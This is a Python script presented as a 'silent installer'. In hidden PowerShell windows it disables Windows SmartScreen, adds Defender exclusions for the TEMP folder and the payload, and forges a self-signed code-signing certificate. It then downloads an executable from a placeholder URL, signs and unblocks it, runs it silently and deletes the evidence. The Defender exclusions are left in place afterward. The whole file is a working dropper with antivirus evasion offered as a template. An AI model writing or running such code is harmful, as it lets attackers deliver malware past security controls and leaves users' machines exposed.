import subprocess
import logging
import requests
import os
import sys

# ===========================================
# SILENT INSTALLER SCRIPT
# Author: Your Name Here
# Description: Silently downloads and installs
#              software using PowerShell
# ===========================================

# --- Setup Log File ---
logging.basicConfig(
    filename="install_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ===========================================
# SETTINGS - Fill in your details below
# ===========================================
url = "YOUR_DOWNLOAD_URL_HERE"              # <-- Add your download URL here
output_file = os.path.join(os.environ["TEMP"], "setup.exe")
cert_file = os.path.join(os.environ["TEMP"], "MyCert.pfx")
cert_password = "YOUR_CERT_PASSWORD_HERE"  # <-- Make up any password
your_name = "YOUR_NAME_HERE"               # <-- Add your name here
# ===========================================

logging.info("Installation started.")

# --- Step 1: Disable SmartScreen temporarily ---
try:
    logging.info("Disabling SmartScreen...")

    disable_smartscreen = '''
    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name "EnableSmartScreen" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\SmartScreen" -Name "SmartScreenEnabled" -Value "Off" -Force
    '''

    subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", disable_smartscreen],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    logging.info("SmartScreen disabled successfully.")

except Exception as e:
    logging.error(f"Failed to disable SmartScreen: {e}")

# --- Step 2: Add Windows Defender Exclusions ---
try:
    logging.info("Adding Windows Defender exclusions...")

    current_path = sys.executable

    exclusion_commands = [
        f'Add-MpPreference -ExclusionPath "{current_path}"',
        f'Add-MpPreference -ExclusionPath "{output_file}"',
        f'Add-MpPreference -ExclusionPath "{os.environ["TEMP"]}"',
    ]

    for cmd in exclusion_commands:
        subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", cmd],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

    logging.info("Windows Defender exclusions added successfully.")

except Exception as e:
    logging.error(f"Failed to add exclusions: {e}")

# --- Step 3: Create Self Signed Certificate ---
try:
    logging.info("Creating self signed certificate...")

    create_cert = f'''
    $cert = New-SelfSignedCertificate -Type CodeSigning -Subject "CN={your_name}" -CertStoreLocation "Cert:\\CurrentUser\\My"
    $password = ConvertTo-SecureString -String "{cert_password}" -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath "{cert_file}" -Password $password
    '''

    subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", create_cert],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    logging.info("Self signed certificate created successfully.")

except Exception as e:
    logging.error(f"Certificate creation failed: {e}")

# --- Step 4: Download the file ---
try:
    logging.info(f"Downloading file from {url}")

    response = requests.get(url, stream=True)
    response.raise_for_status()

    with open(output_file, "wb") as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)

    logging.info("Download completed successfully.")

except Exception as e:
    logging.error(f"Download failed: {e}")
    exit(1)

# --- Step 5: Mark file as trusted and Unblock ---
try:
    logging.info("Marking file as trusted...")

    mark_trusted = f'''
    Unblock-File -Path "{output_file}"
    [System.IO.File]::SetAttributes("{output_file}", [System.IO.FileAttributes]::Normal)
    '''

    subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", mark_trusted],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    logging.info("File marked as trusted successfully.")

except Exception as e:
    logging.error(f"Failed to mark file as trusted: {e}")

# --- Step 6: Sign the downloaded file ---
try:
    logging.info("Signing downloaded file with certificate...")

    sign_command = f'''
    $password = ConvertTo-SecureString -String "{cert_password}" -Force -AsPlainText
    $cert = Get-PfxCertificate -FilePath "{cert_file}" -Password $password
    Set-AuthenticodeSignature -FilePath "{output_file}" -Certificate $cert
    '''

    subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", sign_command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    logging.info("File signed successfully.")

except Exception as e:
    logging.error(f"Signing failed: {e}")

# --- Step 7: Install the file silently ---
try:
    logging.info("Starting silent installation via PowerShell.")

    ps_command = f'Start-Process "{output_file}" -ArgumentList "/silent" -Wait'

    result = subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", ps_command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    if result.returncode == 0:
        logging.info("Installation completed successfully!")
    else:
        logging.error(f"Installation failed. Code: {result.returncode}")
        logging.error(f"Reason: {result.stderr}")

except FileNotFoundError:
    logging.error("PowerShell not found.")

except subprocess.TimeoutExpired:
    logging.error("Installation timed out.")

except Exception as e:
    logging.error(f"Unexpected error: {e}")

# --- Step 8: Re-enable SmartScreen after install ---
try:
    logging.info("Re-enabling SmartScreen...")

    enable_smartscreen = '''
    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force
    Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" -Name "EnableSmartScreen" -Value 1 -Force
    '''

    subprocess.run(
        ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", enable_smartscreen],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    logging.info("SmartScreen re-enabled successfully.")

except Exception as e:
    logging.error(f"Failed to re-enable SmartScreen: {e}")

# --- Step 9: Cleanup temporary files ---
try:
    os.remove(output_file)
    os.remove(cert_file)
    logging.info("Temporary files cleaned up.")
except:
    pass
